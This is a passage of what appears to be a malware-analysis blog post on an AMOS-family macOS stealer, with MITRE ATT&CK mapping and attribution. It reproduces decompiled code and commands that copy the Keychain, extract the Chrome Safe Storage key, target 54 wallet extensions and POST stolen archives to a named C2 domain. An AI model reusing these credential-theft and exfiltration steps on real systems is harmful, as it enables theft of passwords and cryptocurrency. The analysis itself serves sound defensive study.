+</span></span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="k">with</span> <span class="nv">icon</span> <span class="nv">file</span> <span class="s2">&#34;System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:ToolbarAdvanced.icns&#34;</span> <span class="se">¬
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="nv">default</span> <span class="nv">answer</span> <span class="s2">&#34;&#34;</span> <span class="se">¬
+</span></span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="nv">giving</span> <span class="nv">up</span> <span class="nb">after</span> <span class="mi">30</span> <span class="se">¬
+</span></span></span><span class="line"><span class="ln">8</span><span class="cl">    <span class="k">with</span> <span class="na">hidden</span> <span class="nv">answer</span></span></span></code></pre></div></div>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="922"
+    height="363"
+    src="/investigations/macos-amos/phishing_dialog_hu_c3faf8d4d9d73b00.png"
+    srcset="/investigations/macos-amos/phishing_dialog_hu_c3faf8d4d9d73b00.png 800w, /investigations/macos-amos/phishing_dialog.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/phishing_dialog.png"></figure>
+</p>
+<p>The entered password is verified with the same <code>dscl</code> call, this time with the
+real value. If the password is incorrect, the dialog is shown again. The
+validated password is written to the archive as a separate file named
+<strong>password-entered</strong>. The archive is built in the process memory using
+<code>archive/zip.NewWriter</code>, which receives a <code>bytes.Buffer</code>, file copying is
+handled by the <code>main_write</code> function.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="782"
+    height="198"
+    src="/investigations/macos-amos/main_write.png"
+    srcset="/investigations/macos-amos/main_write.png 800w, /investigations/macos-amos/main_write.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/main_write.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">Keychain store theft</span>
+    <div id="keychain-store-theft" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#keychain-store-theft" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>After obtaining the password, the sample attempts to steal the Keychain.
+Physically it is stored in the file <code>login.keychain-db</code> in the user&rsquo;s profile
+folder, encrypted with the account password, so the sample copies this file into
+the archive and named it as <code>login-keychain</code>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">runtime_concatstring3</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;/Users/&#34;</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">main_user</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">main_user</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="s">&#34;/Library/Keychains/login.keychain-db&#34;</span><span class="p">,</span> <span class="mi">36</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="k">return</span> <span class="nf">main_write</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="s">&#34;login-keychain&#34;</span><span class="p">,</span> <span class="mi">14</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>Together with the password, this grants full access to the contents of the
+store: website and application passwords, certificates, authentication tokens,
+and so on.</p>
+<p>On systems where the account has no password, a different branch the dialog is not shown and the Keychain container is not copied, instead the
+sample extracts the <strong>Chrome Safe Storage key</strong> from it. This is the key with which
+Chromium encrypts its password and cookie databases. The result is saved to the
+archive under the path <code>Chromium/Chrome/Local State</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">security 2&gt;&amp;1 &gt; /dev/null find-generic-password -ga &#39;Chrome&#39; | awk &#39;{print $2}&#39;</span></span></code></pre></div></div>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="792"
+    height="247"
+    src="/investigations/macos-amos/chromium_local_state.png"
+    srcset="/investigations/macos-amos/chromium_local_state.png 800w, /investigations/macos-amos/chromium_local_state.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/chromium_local_state.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">Cryptocurrency wallet data theft</span>
+    <div id="cryptocurrency-wallet-data-theft" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cryptocurrency-wallet-data-theft" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>After the credentials, the sample moves on to collecting cryptocurrency
+wallets. Its targets are Electrum, Coinomi, Exodus, Atomic Wallet and Binance.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="917"
+    height="371"
+    src="/investigations/macos-amos/wallets_init_hu_4a307ea0303fe979.png"
+    srcset="/investigations/macos-amos/wallets_init_hu_4a307ea0303fe979.png 800w, /investigations/macos-amos/wallets_init.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/wallets_init.png"></figure>
+</p>
+<p>For Electrum, Coinomi, Exodus and Atomic Wallet the sample takes entire contents of the
+directory. It retrieves the name of each file and copies it into the archive under the path <code>Wallets/&lt;wallet&gt;/&lt;file&gt;</code>.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="793"
+    height="424"
+    src="/investigations/macos-amos/wallet_paths.png"
+    srcset="/investigations/macos-amos/wallet_paths.png 800w, /investigations/macos-amos/wallet_paths.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/wallet_paths.png"></figure>
+</p>
+<p>For Binance only a single specific file, <code>app-store.json</code>, is taken. It stores
+session data and account configuration:</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="707"
+    height="53"
+    src="/investigations/macos-amos/binance.png"
+    srcset="/investigations/macos-amos/binance.png 800w, /investigations/macos-amos/binance.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/binance.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">Browser data theft</span>
+    <div id="browser-data-theft" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#browser-data-theft" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The sample steals data from Chrome, Brave, Edge, Vivaldi, Yandex, Opera,
+Opera GX and Firefox.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="777"
+    height="683"
+    src="/investigations/macos-amos/browsers.png"
+    srcset="/investigations/macos-amos/browsers.png 800w, /investigations/macos-amos/browsers.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/browsers.png"></figure>
+</p>
+<p><strong>Chromium</strong></p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="716"
+    height="125"
+    src="/investigations/macos-amos/grabchrome.png"
+    srcset="/investigations/macos-amos/grabchrome.png 800w, /investigations/macos-amos/grabchrome.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/grabchrome.png"></figure>
+</p>
+<p>For each Chromium browser a recursive traversal of its directory tree is
+performed using <code>filepath.Walk()</code> with the callback function
+<code>main_GrabChrome_func1</code>, which locates and copies into the archive:</p>
+<ul>
+<li><strong>Cookies</strong></li>
+<li><strong>Login Data</strong> with saved logins and passwords</li>
+<li><strong>Web Data</strong> with autofill data</li>
+<li><strong>Local Extension Settings</strong>, the directory holding installed extension data</li>
+</ul>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="837"
+    height="350"
+    src="/investigations/macos-amos/chrome_data_hu_13059e19b8575e8a.png"
+    srcset="/investigations/macos-amos/chrome_data_hu_13059e19b8575e8a.png 800w, /investigations/macos-amos/chrome_data.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/chrome_data.png"></figure>
+</p>
+<p>Having found the <code>Local Extension Settings</code> directory with the extension data,
+the sample reads its contents and compares the name of each extension against a
+built-in list of 54 crypto extension IDs, copying matches into the archive for
+exfiltration.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Extension ID</th>
+          <th>Wallet</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>acmacodkjbdgmoleebolmdjonilkdbch</td>
+          <td>Rabby Wallet</td>
+      </tr>
+      <tr>
+          <td>aeachknmefphepccionboohckonoeemg</td>
+          <td>Coin98 Wallet</td>
+      </tr>
+      <tr>
+          <td>afbcbjpbpfadlkmhmclhkeeodmamcflc</td>
+          <td>Math Wallet</td>
+      </tr>
+      <tr>
+          <td>aholpfdialjgjfhomihkjbmgjidlcdno</td>
+          <td>Exodus Web3 Wallet</td>
+      </tr>
+      <tr>
+          <td>aiifbnbfobpmeekipheeijimdpnlpgpp</td>
+          <td>Station Wallet</td>
+      </tr>
+      <tr>
+          <td>amkmjjmmflddogmhpjloimipbofnfjih</td>
+          <td>Wombat</td>
+      </tr>
+      <tr>
+          <td>apnehcjmnengpnmccpaibjmhhoadaico</td>
+          <td>CWallet</td>
+      </tr>
+      <tr>
+          <td>bcopgchhojmggmffilplmbdicgaihlkp</td>
+          <td>Hycon Lite Client</td>
+      </tr>
+      <tr>
+          <td>bfnaelmomeimhlpmgjnjophhpkkoljpa</td>
+          <td>Phantom</td>
+      </tr>
+      <tr>
+          <td>bocpokimicclpaiekenaeelehdjllofo</td>
+          <td>XDCPay</td>
+      </tr>
+      <tr>
+          <td>cgeeodpfagjceefieflmdfphplkenlfk</td>
+          <td>EVER Wallet</td>
+      </tr>
+      <tr>
+          <td>cihmoadaighcejopammfbmddcmdekcje</td>
+          <td>LeafWallet</td>
+      </tr>
+      <tr>
+          <td>cjelfplplebdjjenllpjcblmjkfcffne</td>
+          <td>Jaxx Liberty</td>
+      </tr>
+      <tr>
+          <td>cjmkndjhnagcfbpiemnkdpomccnjblmj</td>
+          <td>Finnie</td>
+      </tr>
+      <tr>
+          <td>cmndjbecilbocjfkibfbifhngkdmjgog</td>
+          <td>Swash</td>
+      </tr>
+      <tr>
+          <td>cnmamaachppnkjgnildpdmkaakejnhae</td>
+          <td>Auro</td>
+      </tr>
+      <tr>
+          <td>copjnifcecdedocejpaapepagaodgpbh</td>
+          <td>Freaks Axie</td>
+      </tr>
+      <tr>
+          <td>cphhlgmgameodnhkjdmkpanlelnlohao</td>
+          <td>NeoLine</td>
+      </tr>
+      <tr>
+          <td>dhgnlgphgchebgoemcjekedjjbifijid</td>
+          <td>Crypto Airdrops &amp; Bounties</td>
+      </tr>
+      <tr>
+          <td>dkdedlpgdmmkkfjabffeganieamfklkm</td>
+          <td>Cyano</td>
+      </tr>
+      <tr>
+          <td>dmkamcknogkgcdfhhbddcghachkejeap</td>
+          <td>Keplr</td>
+      </tr>
+      <tr>
+          <td>efbglgofoippbgcjepnhiblaibcnclgk</td>
+          <td>Martian Wallet for Sui &amp; Aptos</td>
+      </tr>
+      <tr>
+          <td>egjidjbpglichdcondbcbdnbeeppgdph</td>
+          <td>Trust Wallet</td>
+      </tr>
+      <tr>
+          <td>ffnbelfdoeiohenkjibnmadjiehjhajb</td>
+          <td>Yoroi</td>
+      </tr>
+      <tr>
+          <td>fhbohimaelbohpjbbldcngcnapndodjp</td>
+          <td>BinanceChain</td>
+      </tr>
+      <tr>
+          <td>fhilaheimglignddkjgofkcbgekhenbh</td>
+          <td>Oxygen</td>
+      </tr>
+      <tr>
+          <td>flpiciilemghbmfalicajoolhkkenfel</td>
+          <td>ICONex</td>
+      </tr>
+      <tr>
+          <td>fnjhmkhhmkbjkkabndcnnogagogbneec</td>
+          <td>Ronin</td>
+      </tr>
+      <tr>
+          <td>fnnegphlobjdpkhecapkijjdkgcjhkib</td>
+          <td>Harmony Wallet</td>
+      </tr>
+      <tr>
+          <td>hcflpincpppdclinealmandijcmnkbgn</td>
+          <td>KHC</td>
+      </tr>
+      <tr>
+          <td>hmeobnfnfcmdkdcmlblgagmfpfboieaf</td>
+          <td>XDEFI</td>
+      </tr>
+      <tr>
+          <td>hnfanknocfeofbddgcijnmhnfnkdnaad</td>
+          <td>Coinbase</td>
+      </tr>
+      <tr>
+          <td>hnhobjmcibchnmglfbldbfabcgaknlkj</td>
+          <td>Flint Wallet</td>
+      </tr>
+      <tr>
+          <td>hpglfhgfnhbgpjdenjgmdgoeiappafln</td>
+          <td>Guarda</td>
+      </tr>
+      <tr>
+          <td>ibnejdfjmmkpcnlpebklmnkoeoihofec</td>
+          <td>TronLink</td>
+      </tr>
+      <tr>
+          <td>imloifkgjagghnncjkhggdhalmcnfklk</td>
+          <td>Trezor Password Manager</td>
+      </tr>
+      <tr>
+          <td>jojhfeoedkpkglbfimdfabpdfjaoolaf</td>
+          <td>Polymesh</td>
+      </tr>
+      <tr>
+          <td>klnaejjgbibmhlephnhpmaofohgkpgkd</td>
+          <td>ZilPay</td>
+      </tr>
+      <tr>
+          <td>kncchdigobghenbbaddojjnnaogfppfj</td>
+          <td>iWallet</td>
+      </tr>
+      <tr>
+          <td>kpfopkelmapcoipemfendmdcghnegimn</td>
+          <td>Liquality</td>
+      </tr>
+      <tr>
+          <td>lodccjjbdhfakaekdiahmedfbieldgik</td>
+          <td>DAppPlay</td>
+      </tr>
+      <tr>
+          <td>mfhbebgoclkghebffdldpobeajmbecfk</td>
+          <td>Starcoin</td>
+      </tr>
+      <tr>
+          <td>mnfifefkajgofkcjkemidiaecocnkjeh</td>
+          <td>TezBox</td>
+      </tr>
+      <tr>
+          <td>nhnkbkgjikgcigadomkphalanndcapjk</td>
+          <td>CLW</td>
+      </tr>
+      <tr>
+          <td>nkbihfbeogaeaoehlefnkodbefgpgknn</td>
+          <td>MetaMask</td>
+      </tr>
+      <tr>
+          <td>nknhiehlklippafakaeklbeglecifhad</td>
+          <td>Nabox</td>
+      </tr>
+      <tr>
+          <td>nlbmnnijcnlegkjjpcfjclmcfggfefdm</td>
+          <td>MewCx</td>
+      </tr>
+      <tr>
+          <td>nlgbhdfgdhgbiamfdfmbikcdghidoadd</td>
+          <td>Byone</td>
+      </tr>
+      <tr>
+          <td>nphplpgoakhhjchkkhmiggakijnkhfnd</td>
+          <td>TON</td>
+      </tr>
+      <tr>
+          <td>ookjlbkiijinhpmnjffcofjonbfbgaoc</td>
+          <td>Temple</td>
+      </tr>
+      <tr>
+          <td>pdadjkfkgcafgbceimcpbkalnfnepbnk</td>
+          <td>KardiaChain</td>
+      </tr>
+      <tr>
+          <td>pnndplcbkakcplkjnolgbkdgjikjednm</td>
+          <td>Tron Wallet &amp; Explorer</td>
+      </tr>
+      <tr>
+          <td>pocmplpaccanhmnllbbkpgfliimjljgo</td>
+          <td>Slope</td>
+      </tr>
+      <tr>
+          <td>ppdadbejkmjnefldpcdjhnkpbjkikoip</td>
+          <td>Oasis</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Firefox</strong></p>
+<p>For Firefox it locates and copies the files <code>cookies.sqlite</code> and
+<code>formhistory.sqlite</code> from <code>~/Library/Application Support/Firefox/Profiles/</code>:</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="799"
+    height="388"
+    src="/investigations/macos-amos/GrabFirefox.png"
+    srcset="/investigations/macos-amos/GrabFirefox.png 800w, /investigations/macos-amos/GrabFirefox.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/GrabFirefox.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">File collection</span>
+    <div id="file-collection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#file-collection" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The sample searches for and copies into the archive files with the extensions
+<code>.txt, .rtf, .key, .wallet, .private, .secret</code> from the desktop and the
+documents folder.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">mw_filegrabber_exts</span> <span class="o">=</span> <span class="nf">strings_Split</span><span class="p">(</span><span class="s">&#34;.txt,.rtf,.key,.wallet,.private,.secret&#34;</span><span class="p">,</span> <span class="s">&#34;,&#34;</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>The search is performed across two directories, <code>~/Desktop/</code> and
+<code>~/Documents/</code>. Files from the desktop go into the archive under the prefix
+<code>FileGrabber/</code>, and those from the documents folder under <code>FileGrabber/doc_</code>.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="1019"
+    height="423"
+    src="/investigations/macos-amos/file_grabber_hu_b2ef421e03d810e3.png"
+    srcset="/investigations/macos-amos/file_grabber_hu_b2ef421e03d810e3.png 800w, /investigations/macos-amos/file_grabber.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/file_grabber.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">System information collection</span>
+    <div id="system-information-collection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#system-information-collection" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The sample also collects data about the infected machine. It executes
+<code>system_profiler SPHardwareDataType</code> command. This command returns data
+about the device model, model identifier, processor type and core count, memory
+size, serial number and hardware UUID. The command output is written to the
+archive under the name <code>Sysinfo.txt</code>:</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="759"
+    height="190"
+    src="/investigations/macos-amos/sysinfo.png"
+    srcset="/investigations/macos-amos/sysinfo.png 800w, /investigations/macos-amos/sysinfo.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/sysinfo.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">Exfiltration</span>
+    <div id="exfiltration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#exfiltration" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>After collection, all the data is encoded in base64 and sent via an HTTP POST
+request to the domain <code>amos-malware.ru</code> at the <code>sendlog</code> endpoint.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">v26</span>       <span class="o">=</span> <span class="nf">archive_zip__ptr_Writer_Close</span><span class="p">(</span><span class="n">main_writer</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">data</span>      <span class="o">=</span> <span class="nf">bytes__ptr_Buffer_Bytes</span><span class="p">(</span><span class="n">main_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">data_bs64</span> <span class="o">=</span> <span class="nf">encoding_base64__ptr_Encoding_EncodeToString</span><span class="p">(</span><span class="n">encoding_base64_URLEncoding</span><span class="p">,</span> <span class="p">...);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1">//  ...[snip]...
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="k">return</span> <span class="nf">net_http_PostForm</span><span class="p">(</span><span class="s">&#34;http://amos-malware.ru/sendlog&#34;</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v22</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>Three additional fields are inserted into the request:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="nf">runtime_mapassign_faststr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RTYPE_net_url_Values</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v22</span><span class="p">,</span> <span class="s">&#34;BuildID&#34;</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>   <span class="c1">// main_buildid
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nf">runtime_mapassign_faststr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RTYPE_net_url_Values</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v22</span><span class="p">,</span> <span class="s">&#34;user&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>      <span class="c1">// main_userlog
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nf">runtime_mapassign_faststr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RTYPE_net_url_Values</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v22</span><span class="p">,</span> <span class="s">&#34;B64&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>       <span class="c1">// archive in base64
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="k">return</span> <span class="nf">net_http_PostForm</span><span class="p">(</span><span class="s">&#34;http://amos-malware.ru/sendlog&#34;</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v22</span><span class="p">);</span></span></span></code></pre></div></div>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="1087"
+    height="616"
+    src="/investigations/macos-amos/sendlog_hu_88d74e6a18c4aac7.png"
+    srcset="/investigations/macos-amos/sendlog_hu_88d74e6a18c4aac7.png 800w, /investigations/macos-amos/sendlog.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/sendlog.png"></figure>
+</p>
+<p>The <code>B64</code> field contains the entire archive of stolen data. The other two
+fields are populated from global variables:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">_main_buildid   = &#34;UNICEF&#34;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">_main_userlog   = &#34;Holocaust&#34;</span></span></code></pre></div></div>
+<p>the C2 server was confirmed live. A test POST request received an <code>HTTP/1.1 200 OK</code> response from <em>34.41.139.193</em> (Google Cloud Platform), served by nginx.
+server-side input checking.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="774"
+    height="211"
+    src="/investigations/macos-amos/burp.png"
+    srcset="/investigations/macos-amos/burp.png 800w, /investigations/macos-amos/burp.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/burp.png"></figure>
+</p>
+<p>After exfiltration, the user is shown a fake application error message. The
+user sees an ordinary launch failure and has no reason to look for outside
+activity. The sample terminates at this point.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt"
+    width="921"
+    height="317"
+    src="/investigations/macos-amos/main_hu_a85e969e54173477.png"
+    srcset="/investigations/macos-amos/main_hu_a85e969e54173477.png 800w, /investigations/macos-amos/main.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/macos-amos/main.png"></figure>
+</p>
+
+<h3 class="relative group"><span class="hl">Attribution</span>
+    <div id="attribution" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#attribution" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Based on the combination of the domain name, functional overlap, and
+infrastructure model, the sample is assessed with moderate confidence as
+belonging to the <strong>Atomic macOS Stealer (AMOS)</strong> family or a closely derived
+variant.</p>
+<p>The domain <code>amos-malware[.]ru</code> directly references the AMOS brand. The
+collected data categories — Keychain container, Chrome Safe Storage key, browser
+credential databases, cryptocurrency wallet files, and a filegrabber targeting
+the same six extensions — match the publicly documented AMOS capability set
+precisely</p>
+
+<h3 class="relative group"><span class="hl">MITRE ATT&amp;CK</span>
+    <div id="mitre-attck" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#mitre-attck" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Tactic</th>
+          <th>ID</th>
+          <th>Technique</th>
+          <th>Procedure</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Credential Access</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1056/002/"  target="_blank" rel="noreferrer">T1056.002</a></td>
+          <td>GUI Input Capture</td>
+          <td>The sample displays a fake System Preferences dialog via osascript, looping until the user enters a valid password</td>
+      </tr>
+      <tr>
+          <td><strong>Credential Access</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1555/001/"  target="_blank" rel="noreferrer">T1555.001</a></td>
+          <td>Keychain</td>
+          <td>The sample copies login.keychain-db and extracts the Chrome Safe Storage key via security find-generic-password</td>
+      </tr>
+      <tr>
+          <td><strong>Credential Access</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1555/003/"  target="_blank" rel="noreferrer">T1555.003</a></td>
+          <td>Web Browsers</td>
+          <td>The sample collects Login Data databases and the Chrome Safe Storage key from all Chromium-based browsers</td>
+      </tr>
+      <tr>
+          <td><strong>Credential Access</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1539/"  target="_blank" rel="noreferrer">T1539</a></td>
+          <td>Steal Web Session Cookie</td>
+          <td>The sample collects Cookies and cookies.sqlite from Chromium browsers and Firefox</td>
+      </tr>
+      <tr>
+          <td><strong>Credential Access</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1552/001/"  target="_blank" rel="noreferrer">T1552.001</a></td>
+          <td>Credentials In Files</td>
+          <td>The filegrabber targets files with extensions .key, .private, .secret, and .txt on the desktop and in documents</td>
+      </tr>
+      <tr>
+          <td><strong>Collection</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1005/"  target="_blank" rel="noreferrer">T1005</a></td>
+          <td>Data from Local System</td>
+          <td>The sample collects wallet files, browser databases, documents and system information from the local file system</td>
+      </tr>
+      <tr>
+          <td><strong>Collection</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1560/002/"  target="_blank" rel="noreferrer">T1560.002</a></td>
+          <td>Archive via Library</td>
+          <td>All collected data is written into an in-memory ZIP archive using archive/zip</td>
+      </tr>
+      <tr>
+          <td><strong>Collection</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1217/"  target="_blank" rel="noreferrer">T1217</a></td>
+          <td>Browser Information Discovery</td>
+          <td>The sample enumerates browser profiles via filepath.Walk and os.ReadDir</td>
+      </tr>
+      <tr>
+          <td><strong>Defense Evasion</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1036/005/"  target="_blank" rel="noreferrer">T1036.005</a></td>
+          <td>Match Legitimate Name or Location</td>
+          <td>The phishing dialog uses the System Preferences title and a genuine CoreTypes.bundle icon</td>
+      </tr>
+      <tr>
+          <td><strong>Discovery</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1082/"  target="_blank" rel="noreferrer">T1082</a></td>
+          <td>System Information Discovery</td>
+          <td>The sample executes system_profiler SPHardwareDataType to collect hardware details</td>
+      </tr>
+      <tr>
+          <td><strong>Discovery</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1033/"  target="_blank" rel="noreferrer">T1033</a></td>
+          <td>System Owner/User Discovery</td>
+          <td>The sample retrieves the current username via os.Getenv(&ldquo;USER&rdquo;)</td>
+      </tr>
+      <tr>
+          <td><strong>Execution</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1059/002/"  target="_blank" rel="noreferrer">T1059.002</a></td>
+          <td>AppleScript</td>
